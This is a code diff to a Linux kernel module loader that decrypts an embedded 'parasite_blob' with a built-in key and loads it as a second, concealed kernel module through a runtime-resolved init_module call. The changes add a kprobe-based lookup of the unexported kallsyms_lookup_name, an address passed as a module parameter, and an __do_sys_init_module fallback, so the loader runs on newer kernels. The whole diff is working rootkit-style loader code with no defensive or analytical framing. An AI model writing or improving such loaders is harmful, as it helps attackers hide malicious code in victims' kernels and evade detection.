@@ -5,24 +5,43 @@
 #include <linux/version.h>
 #include <linux/mman.h>
 
+#ifdef CONFIG_KPROBES
+# include <linux/kprobes.h>
+#endif
+
 #include "encrypt/encrypt.h"
 
 static char parasite_blob[] = {
 # include "parasite_blob.inc"
 };
 
-static int ksym_lookup_cb(unsigned long data[], const char *name, void *module, unsigned long addr)
-{
-	int i = 0; while (!module && (((const char *)data[0]))[i] == name[i]) {
-		if (!name[i++]) return !!(data[1] = addr);
-	} return 0;
-}
+static long lookupName = 0;
+module_param(lookupName, long, 0);
 
-static inline unsigned long ksym_lookup_name(const char *name)
+// kernel module loader STB_WEAK binding hack
+extern __attribute__((weak)) unsigned long kallsyms_lookup_name(const char *);
+
+unsigned long ksym_lookup_name(const char *name)
 {
-	unsigned long data[2] = { (unsigned long)name, 0 };
-	kallsyms_on_each_symbol((void *)ksym_lookup_cb, data);
-	return data[1];
+	static typeof(ksym_lookup_name) *lookup_name = kallsyms_lookup_name;
+#ifdef CONFIG_KPROBES
+	if (NULL == lookup_name) {
+		struct kprobe probe;
+		int callback(struct kprobe *p, struct pt_regs *regs) {
+			return 0;
+		}
+		memset(&probe, 0, sizeof(probe));
+		probe.pre_handler = callback;
+		probe.symbol_name = "kallsyms_lookup_name";
+		if (!register_kprobe(&probe)) {
+			lookup_name = (void *)probe.addr;
+			unregister_kprobe(&probe);
+		}
+	}
+#endif
+	if (NULL == lookup_name)
+		lookup_name = (void *)lookupName;
+	return lookup_name ? lookup_name(name) : 0;
 }
 
 int init_module(void)
@@ -36,14 +55,20 @@ int init_module(void)
 	do_decrypt(parasite_blob, sizeof(parasite_blob), DECRYPT_KEY);
 
 	sys_init_module = (void *)ksym_lookup_name("sys_init_module");
+	if (!sys_init_module) {
+		sys_init_module = (void *)ksym_lookup_name("__do_sys_init_module");
+		if (!sys_init_module) {
+			printk("No `[__do_]sys_init_module` found\n");
+			return -EINVAL;
+		}
+	}
+
 	if (sys_init_module) {
 		const size_t len = roundup(sizeof(parasite_blob), PAGE_SIZE);
-		const char *nullarg = parasite_blob;
 		void *map = (void *)vm_mmap(NULL, 0, len, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0);
 		if (map) {
-			while (*nullarg) nullarg++;
 			copy_to_user(map, parasite_blob, sizeof(parasite_blob));
-			sys_init_module(parasite_blob, sizeof(parasite_blob), nullarg);
+			sys_init_module(map, sizeof(parasite_blob), map + sizeof(parasite_blob));
 			vm_munmap((unsigned long)map, len);
 		}
 	}
